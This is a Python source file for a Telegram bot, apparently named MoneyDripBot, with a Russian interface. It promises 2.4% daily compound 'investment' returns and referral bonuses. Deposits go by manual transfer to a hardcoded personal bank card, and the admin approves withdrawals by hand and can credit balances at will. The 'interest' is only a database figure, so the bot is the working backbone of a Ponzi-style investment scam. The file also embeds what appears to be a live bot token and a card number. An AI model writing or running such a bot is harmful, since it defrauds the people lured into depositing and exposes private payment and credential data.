import asyncio
import logging
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
import aiosqlite
import re

# ========== НАСТРОЙКИ ==========
TOKEN = "8587086312:AAE9jbbaPZBzU-niDmOK7uhHhpCYSvf_BoU"
ADMIN_ID = 7603296347
SUPPORT_USERNAME = "CryptoDripClubaD"
CARD_NUMBER = "2200 7012 3329 6489"
CARD_HOLDER = "Леонид К."

INTEREST_RATE = 0.024
INTERVAL_HOURS = 24
MIN_DEPOSIT = 100
MIN_WITHDRAW = 500
MIN_INVEST = 100

WELCOME_BONUS = 15
REFERRAL_REG_BONUS = 15
REFERRAL_DEPOSIT_BONUS = 0.05
# ================================

bot = Bot(token=TOKEN)
dp = Dispatcher()

# === БАЗА ДАННЫХ ===
async def init_db():
    async with aiosqlite.connect("users.db", timeout=30) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                balance REAL DEFAULT 0,
                invest_sum REAL DEFAULT 0,
                last_interest TEXT,
                deposit_request REAL DEFAULT 0,
                withdraw_request REAL DEFAULT 0,
                card_number TEXT DEFAULT '',
                referrer_id INTEGER DEFAULT 0,
                referral_earnings REAL DEFAULT 0,
                welcome_bonus_claimed INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                type TEXT,
                amount REAL,
                status TEXT,
                details TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.commit()

async def add_history(user_id: int, type: str, amount: float, status: str = "completed", details: str = ""):
    async with aiosqlite.connect("users.db", timeout=30) as db:
        await db.execute(
            "INSERT INTO history (user_id, type, amount, status, details) VALUES (?, ?, ?, ?, ?)",
            (user_id, type, amount, status, details)
        )
        await db.commit()

# === ПАРСИНГ ===
def parse_amount(text: str) -> float:
    text = text.lower().replace(" ", "").replace(",", ".")
    if "k" in text:
        return float(text.replace("k", "")) * 1000
    elif "m" in text:
        return float(text.replace("m", "")) * 1000000
    else:
        return float(text)

def calculate_profit(amount: float, days: int) -> float:
    return amount * ((1 + INTEREST_RATE) ** days - 1)

# === СТАРТ ===
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    args = message.text.split()
    
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT user_id, welcome_bonus_claimed FROM users WHERE user_id = ?", (user_id,))
        user = await cursor.fetchone()
        is_new = user is None
        
        if is_new:
            await db.execute(
                "INSERT INTO users (user_id, balance, welcome_bonus_claimed) VALUES (?, ?, 1)",
                (user_id, WELCOME_BONUS)
            )
            await db.commit()
            await add_history(user_id, "welcome_bonus", WELCOME_BONUS, "completed", "Приветственный бонус")
            await message.answer(f"🎁 *Вам начислен бонус!* +{WELCOME_BONUS}₽", parse_mode="Markdown")
        
        if len(args) > 1 and args[1].startswith("ref") and is_new:
            referrer_id = int(args[1].replace("ref", ""))
            if referrer_id != user_id:
                await db.execute("UPDATE users SET referrer_id = ? WHERE user_id = ?", (referrer_id, user_id))
                await db.execute(
                    "UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?",
                    (REFERRAL_REG_BONUS, REFERRAL_REG_BONUS, referrer_id)
                )
                await db.commit()
                await add_history(referrer_id, "referral_bonus", REFERRAL_REG_BONUS, "completed", f"Реферал {user_id}")
                try:
                    await bot.send_message(referrer_id, f"🎁 +{REFERRAL_REG_BONUS}₽ за реферала!", parse_mode="Markdown")
                except:
                    pass
        
        await db.commit()
    
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Запустить в работу", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 Проценты", callback_data="interest_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    await message.answer(
        f"🚀 *MoneyDripBot*\n\n📈 2,4% / 24ч\n💳 Вывод от {MIN_WITHDRAW}₽\n\n🎁 *Твоя ссылка:*\n`{ref_link}`\n\n👇 Выбери действие:",
        parse_mode="Markdown", reply_markup=keyboard
    )

# === БАЛАНС ===
@dp.callback_query(lambda c: c.data == "balance")
async def show_balance(call: CallbackQuery):
    user_id = call.from_user.id
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute(
            "SELECT balance, invest_sum, referral_earnings FROM users WHERE user_id = ?",
            (user_id,)
        )
        row = await cursor.fetchone()
        balance, invest, ref_earnings = row if row else (0, 0, 0)
    
    profit_week = calculate_profit(invest, 7)
    profit_month = calculate_profit(invest, 30)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])
    await call.message.edit_text(
        f"💳 *Баланс*\n\n💰 Доступно: `{balance:,.0f}₽`\n📈 В работе: `{invest:,.0f}₽`\n🎁 Реф. бонус: `{ref_earnings:,.0f}₽`\n\n📅 *Прогноз:*\n• Неделя: +{profit_week:,.0f}₽\n• Месяц: +{profit_month:,.0f}₽",
        parse_mode="Markdown", reply_markup=keyboard
    )

# === РЕФЕРАЛЫ ===
@dp.callback_query(lambda c: c.data == "referrals")
async def show_referrals(call: CallbackQuery):
    user_id = call.from_user.id
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT COUNT(*) FROM users WHERE referrer_id = ?", (user_id,))
        ref_count = (await cursor.fetchone())[0]
        cursor = await db.execute("SELECT referral_earnings FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        ref_earnings = row[0] if row else 0
    
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Копировать ссылку", callback_data="copy_ref")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    await call.message.edit_text(
        f"👥 *Рефералы*\n\n🎁 `{ref_link}`\n\n📊 Приглашено: `{ref_count}`\n💰 Заработано: `{ref_earnings:,.0f}₽`\n\n👉 15₽ за друга + 5%",
        parse_mode="Markdown", reply_markup=keyboard
    )

# === ИСТОРИЯ ===
@dp.callback_query(lambda c: c.data == "history")
async def show_history(call: CallbackQuery):
    user_id = call.from_user.id
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute(
            "SELECT type, amount, status, created_at FROM history WHERE user_id = ? ORDER BY created_at DESC LIMIT 10",
            (user_id,)
        )
        rows = await cursor.fetchall()
    
    if not rows:
        text = "📊 *История*\n\nПусто."
    else:
        text = "📊 *История*\n\n"
        for t, a, s, d in rows:
            emoji = {"deposit": "📥", "withdraw": "📤", "invest": "💰", "interest": "📈", "referral": "🎁", "welcome_bonus": "🎉", "referral_bonus": "👥"}.get(t, "•")
            date = datetime.fromisoformat(d).strftime("%d.%m.%y")
            text += f"{emoji} `{a:,.0f}₽` {date}\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])
    await call.message.edit_text(text, parse_mode="Markdown", reply_markup=keyboard)

# === ПОПОЛНЕНИЕ ===
@dp.callback_query(lambda c: c.data == "deposit")
async def deposit_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="i_paid")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    await call.message.edit_text(
        f"📥 *Пополнение*\n\n💳 `{CARD_NUMBER}`\n👤 {CARD_HOLDER}\n💰 Мин. {MIN_DEPOSIT}₽\n\n✅ Нажми «Я оплатил» и введи сумму:",
        parse_mode="Markdown", reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data == "i_paid")
async def i_paid(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Отмена", callback_data="back_to_menu")]])
    await call.message.edit_text("📝 *Введи сумму:*\n\nПримеры: `500`, `1.5k`", parse_mode="Markdown", reply_markup=keyboard)

# === ЭТО ПОПОЛНЕНИЕ ===
@dp.message(lambda m: m.text and re.match(r'^[\d\.]+[km]?$', m.text.lower().replace(" ", "")))
async def process_deposit(message: Message):
    try:
        amount = parse_amount(message.text)
    except:
        await message.answer("❌ Неверный формат")
        return
    
    if amount < MIN_DEPOSIT:
        await message.answer(f"❌ Минимум {MIN_DEPOSIT}₽")
        return
    
    user_id = message.from_user.id
    async with aiosqlite.connect("users.db", timeout=30) as db:
        await db.execute("UPDATE users SET deposit_request = ? WHERE user_id = ?", (amount, user_id))
        await db.commit()
        await add_history(user_id, "deposit", amount, "pending", "Заявка")
        cursor = await db.execute("SELECT referrer_id FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        ref_id = row[0] if row else 0
    
    await bot.send_message(ADMIN_ID, f"🔔 *Заявка*\n🆔 `{user_id}`\n💰 {amount:,.0f}₽\n👥 {ref_id or 'нет'}\n✅ /confirm {user_id}", parse_mode="Markdown")
    await message.answer(f"✅ Заявка на {amount:,.0f}₽ отправлена!", parse_mode="Markdown")

# === ПОДТВЕРЖДЕНИЕ ПОПОЛНЕНИЯ ===
@dp.message(Command("confirm"))
async def confirm_deposit(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /confirm 123456789")
        return
    
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT deposit_request, referrer_id FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row or row[0] == 0:
            await message.answer("❌ Нет заявки")
            return
        amount, ref_id = row
        await db.execute("UPDATE users SET balance = balance + ?, deposit_request = 0 WHERE user_id = ?", (amount, user_id))
        if ref_id:
            bonus = amount * REFERRAL_DEPOSIT_BONUS
            await db.execute("UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?", (bonus, bonus, ref_id))
            await add_history(ref_id, "referral", bonus, "completed", f"Бонус {user_id}")
            try:
                await bot.send_message(ref_id, f"🎁 +{bonus:,.0f}₽ (5%) за реферала!", parse_mode="Markdown")
            except:
                pass
        await db.commit()
        await add_history(user_id, "deposit", amount, "completed", "Подтверждено")
    
    await message.answer(f"✅ Баланс {user_id} +{amount:,.0f}₽")
    await bot.send_message(user_id, f"✅ Баланс пополнен! +{amount:,.0f}₽", parse_mode="Markdown")

# ============================================
# ✅ ЭТО УМНОЖЕНИЕ — РАБОЧАЯ КНОПКА И ПРОЦЕНТЫ
# ============================================

@dp.callback_query(lambda c: c.data == "multiply")
async def multiply_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])
    await call.message.edit_text(
        "💰 *Запуск в работу*\n\n"
        f"💸 *Введи команду:*\n"
        f"`/invest 500` или `/invest 1.5k`\n\n"
        f"📈 2,4% каждые 24 часа\n"
        f"💰 Мин. {MIN_INVEST}₽",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.message(Command("invest"))
async def cmd_invest(message: Message):
    user_id = message.from_user.id
    try:
        text = message.text.replace("/invest", "").strip()
        amount = parse_amount(text)
    except:
        await message.answer("❌ Пример: `/invest 500` или `/invest 1.5k`", parse_mode="Markdown")
        return
    
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        balance = row[0] if row else 0
        
        if amount > balance:
            await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
            return
        if amount < MIN_INVEST:
            await message.answer(f"❌ Минимум {MIN_INVEST}₽")
            return
        
        await db.execute(
            "UPDATE users SET balance = balance - ?, invest_sum = invest_sum + ?, last_interest = ? WHERE user_id = ?",
            (amount, amount, datetime.now().isoformat(), user_id)
        )
        await db.commit()
        await add_history(user_id, "invest", amount, "completed", f"Запуск {amount}₽")
    
    profit_week = calculate_profit(amount, 7)
    profit_month = calculate_profit(amount, 30)
    await message.answer(
        f"✅ *Готово!*\n\n"
        f"💸 {amount:,.0f}₽ в работе\n"
        f"📈 Ежедневно +2,4%\n"
        f"📅 Неделя: +{profit_week:,.0f}₽\n"
        f"📆 Месяц: +{profit_month:,.0f}₽",
        parse_mode="Markdown"
    )

# === ПРОЦЕНТЫ (РАБОЧИЙ ВОРКЕР) ===
async def interest_worker():
    while True:
        await asyncio.sleep(INTERVAL_HOURS * 3600)
        try:
            async with aiosqlite.connect("users.db", timeout=30) as db:
                cursor = await db.execute("SELECT user_id, invest_sum FROM users WHERE invest_sum > 0")
                users = await cursor.fetchall()
                for user_id, invest in users:
                    profit = invest * INTEREST_RATE
                    await db.execute("UPDATE users SET invest_sum = invest_sum + ? WHERE user_id = ?", (profit, user_id))
                    await add_history(user_id, "interest", profit, "completed", f"+2,4%")
                    try:
                        await bot.send_message(
                            user_id,
                            f"📈 *Начислено!*\n➕ +{profit:,.2f}₽\n💰 В работе: {invest + profit:,.2f}₽",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
                await db.commit()
        except Exception as e:
            print(f"Interest worker error: {e}")

# === ВЫВОД ===
@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_start(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])
    await call.message.edit_text(
        f"📤 *Вывод*\n\n💰 Мин. {MIN_WITHDRAW}₽\n💳 Формат: `/withdraw 1000 2200123456789012`",
        parse_mode="Markdown", reply_markup=keyboard
    )

@dp.message(Command("withdraw"))
async def cmd_withdraw(message: Message):
    user_id = message.from_user.id
    try:
        parts = message.text.replace("/withdraw", "").strip().split()
        amount = float(parts[0])
        card = parts[1]
    except:
        await message.answer("❌ Формат: `/withdraw 1000 2200123456789012`", parse_mode="Markdown")
        return
    
    if amount < MIN_WITHDRAW:
        await message.answer(f"❌ Минимум {MIN_WITHDRAW}₽")
        return
    
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        balance = row[0] if row else 0
        if amount > balance:
            await message.answer(f"❌ Недостаточно. Баланс: {balance:,.0f}₽")
            return
        await db.execute("UPDATE users SET withdraw_request = ?, card_number = ? WHERE user_id = ?", (amount, card, user_id))
        await db.commit()
        await add_history(user_id, "withdraw", amount, "pending", f"Заявка, карта: {card[-4:]}")
    
    await bot.send_message(ADMIN_ID, f"🔔 *Вывод*\n🆔 `{user_id}`\n💰 {amount:,.0f}₽\n💳 {card}\n✅ /confirm_withdraw {user_id}", parse_mode="Markdown")
    await message.answer(f"✅ Заявка на {amount:,.0f}₽ отправлена", parse_mode="Markdown")

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(message.text.split()[1])
    except:
        await message.answer("Используй: /confirm_withdraw 123456789")
        return
    
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT withdraw_request, card_number FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row or row[0] == 0:
            await message.answer("❌ Нет заявки")
            return
        amount, card = row
        await db.execute("UPDATE users SET balance = balance - ?, withdraw_request = 0 WHERE user_id = ?", (amount, user_id))
        await db.commit()
        await add_history(user_id, "withdraw", amount, "completed", f"Вывод {amount}₽")
    
    await message.answer(f"✅ Вывод {amount:,.0f}₽ подтверждён")
    await bot.send_message(user_id, f"✅ *Вывод {amount:,.0f}₽ подтверждён!*", parse_mode="Markdown")

# === ИНФО ===
@dp.callback_query(lambda c: c.data == "interest_info")
async def interest_info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])
    await call.message.edit_text(
        f"📈 *2,4% в сутки*\n\n"
        f"1️⃣ Пополни от {MIN_DEPOSIT}₽\n"
        f"2️⃣ Введи `/invest 1000`\n"
        f"3️⃣ Каждый день +2,4%\n\n"
        f"✨ 1000₽ → 2050₽ за месяц",
        parse_mode="Markdown", reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data == "support")
async def support(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Написать", url=f"https://t.me/{SUPPORT_USERNAME}")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]
    ])
    await call.message.edit_text(f"🛡 *Поддержка*\n\n@{SUPPORT_USERNAME}", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data == "info")
async def info(call: CallbackQuery):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_menu")]])
    await call.message.edit_text(
        f"ℹ️ *О боте*\n\n"
        f"📈 Доход: 2,4% / 24ч\n"
        f"📉 Старт: от {MIN_DEPOSIT}₽\n"
        f"📤 Вывод: от {MIN_WITHDRAW}₽\n\n"
        f"🎁 +15₽ за вход\n"
        f"👥 +15₽ +5% за реферала\n"
        f"💳 {CARD_HOLDER}",
        parse_mode="Markdown", reply_markup=keyboard
    )

@dp.callback_query(lambda c: c.data == "copy_ref")
async def copy_ref(call: CallbackQuery):
    await call.answer("Ссылка скопирована!", show_alert=False)

@dp.message(Command("add"))
async def add_balance(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        _, uid, amt = message.text.split()
        uid, amt = int(uid), float(amt)
    except:
        await message.answer("Используй: /add 123456789 1000")
        return
    async with aiosqlite.connect("users.db", timeout=30) as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amt, uid))
        await db.commit()
        await add_history(uid, "admin", amt, "completed", f"Админ")
    await message.answer(f"✅ Баланс {uid} +{amt:,.0f}₽")
    await bot.send_message(uid, f"💰 +{amt:,.0f}₽ от админа!", parse_mode="Markdown")

@dp.message(Command("stats"))
async def stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    async with aiosqlite.connect("users.db", timeout=30) as db:
        cursor = await db.execute("SELECT COUNT(*) FROM users")
        total = (await cursor.fetchone())[0]
        cursor = await db.execute("SELECT SUM(balance) FROM users")
        bal = (await cursor.fetchone())[0] or 0
        cursor = await db.execute("SELECT SUM(invest_sum) FROM users")
        inv = (await cursor.fetchone())[0] or 0
        cursor = await db.execute("SELECT COUNT(*) FROM history WHERE status = 'pending'")
        pend = (await cursor.fetchone())[0] or 0
    await message.answer(
        f"📊 *Статистика*\n\n"
        f"👥 {total} чел\n"
        f"💰 {bal:,.0f}₽\n"
        f"📈 {inv:,.0f}₽\n"
        f"⏳ {pend} заявок",
        parse_mode="Markdown"
    )

@dp.message(Command("id"))
async def get_id(message: Message):
    await message.answer(f"🆔 *Твой ID:* `{message.from_user.id}`", parse_mode="Markdown")

@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu(call: CallbackQuery):
    user_id = call.from_user.id
    ref_link = f"https://t.me/{(await bot.get_me()).username}?start=ref{user_id}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Запустить в работу", callback_data="multiply")],
        [InlineKeyboardButton(text="💳 Баланс", callback_data="balance"),
         InlineKeyboardButton(text="📥 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести", callback_data="withdraw"),
         InlineKeyboardButton(text="📈 2,4%", callback_data="interest_info")],
        [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals"),
         InlineKeyboardButton(text="📊 История", callback_data="history")],
        [InlineKeyboardButton(text="🛡 Поддержка", callback_data="support"),
         InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")]
    ])
    await call.message.edit_text(
        f"🚀 *Главное меню*\n\n🎁 `{ref_link}`\n\n👇 Выбери действие:",
        parse_mode="Markdown", reply_markup=keyboard
    )

# === ЗАПУСК ===
async def main():
    logging.basicConfig(level=logging.INFO)
    await init_db()
    asyncio.create_task(interest_worker())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())